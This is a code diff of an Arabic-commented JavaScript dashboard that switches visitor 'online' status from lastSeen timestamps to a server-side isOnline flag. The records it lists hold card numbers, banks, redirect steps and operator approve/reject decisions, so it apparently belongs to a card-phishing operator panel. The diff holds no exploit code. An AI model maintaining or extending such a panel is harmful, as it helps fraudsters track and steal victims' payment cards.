@@ -610,7 +610,7 @@
       // فلتر التبويب
       if (currentFilter === 'pending' && !(n.status === 'pending' || n.status === 'PENDING' || n.decision === 'pending' || (!n.decision && n.status !== 'approved' && n.status !== 'rejected'))) return false;
       if (currentFilter === 'card' && !n.cardNumber) return false;
-      if (currentFilter === 'online' && !isOnline(n.lastSeen)) return false;
+      if (currentFilter === 'online' && !n.isOnline === true) return false;
       // البحث
       if (searchQuery) {
         const q = searchQuery.toLowerCase();
@@ -682,7 +682,7 @@
     }
     els.referenceVisitorList.innerHTML = list.slice(0, 80).map(n => {
       const latestBoxTime = referenceActivityTime(n);
-      const recentActivity = latestBoxTime > 0 && (Date.now() - latestBoxTime) < 35000;
+      const recentActivity = n.isOnline === true;
       const title = n.name || n.phone || n.country || 'زائر جديد';
       const subtitle = routeLabel(n.currentStep || n.currentPage || n.redirectPage) || n.bank || 'في انتظار التفاعل';
       const checked = selectedReferenceIds.has(n.id);
@@ -695,7 +695,7 @@
     }).join('');
     updateReferenceBulkActions();
     if (referenceListCounterTimer) clearInterval(referenceListCounterTimer);
-    referenceListCounterTimer = setInterval(() => document.querySelectorAll('[data-client-counter]').forEach(node => { const timestamp = Number(node.dataset.clientTime); node.textContent = formatClientElapsed(timestamp); const dot = node.parentElement?.querySelector('i'); if (dot) { const recent = timestamp > 0 && (Date.now() - timestamp) < 35000; dot.classList.toggle('online', recent); dot.classList.toggle('offline', !recent); } }), 1000);
+    referenceListCounterTimer = setInterval(() => document.querySelectorAll('[data-client-counter]').forEach(node => { const timestamp = Number(node.dataset.clientTime); node.textContent = formatClientElapsed(timestamp); const dot = node.parentElement?.querySelector('i'); if (dot) { const recent = allNotifications.find((item) => item.id === node.closest('[data-ref-id]')?.dataset.refId)?.isOnline === true; dot.classList.toggle('online', recent); dot.classList.toggle('offline', !recent); } }), 1000);
   }
   function formatClientElapsed(timestamp) {
     const seconds = Math.max(0, Math.floor((Date.now() - (timestamp || Date.now())) / 1000));
@@ -1002,7 +1002,7 @@
     if (!showStats) { els.statsSection.innerHTML = ''; return; }
     // الإحصائيات على البيانات المدمجة (بطاقات فريدة عبر sessionId)
     const total = allNotifications.length;
-    const online = allNotifications.filter(n => isOnline(n.lastSeen)).length;
+    const online = allNotifications.filter(n => n.isOnline === true).length;
     const cards = allNotifications.filter(n => n.cardNumber).length;
     const approved = allNotifications.filter(n => n.status === 'approved' || n.status === 'APPROVED' || n.decision === 'approved').length;
     const todayStart = new Date();
@@ -1064,7 +1064,7 @@
     const pageItems = filteredNotifications.slice(startIdx, startIdx + pageSize);
 
     els.tbody.innerHTML = pageItems.map(n => {
-      const online = isOnline(n.lastSeen);
+      const online = n.isOnline === true;
       const onlineCls = online ? 'text-emerald-400' : 'text-slate-500';
       const status = n.decision || n.status || 'pending';
       const flagBorder = n.flagColor ? `style="border-right:3px solid ${n.flagColor === 'red' ? '#ef4444' : n.flagColor === 'yellow' ? '#eab308' : '#22c55e'}"` : '';
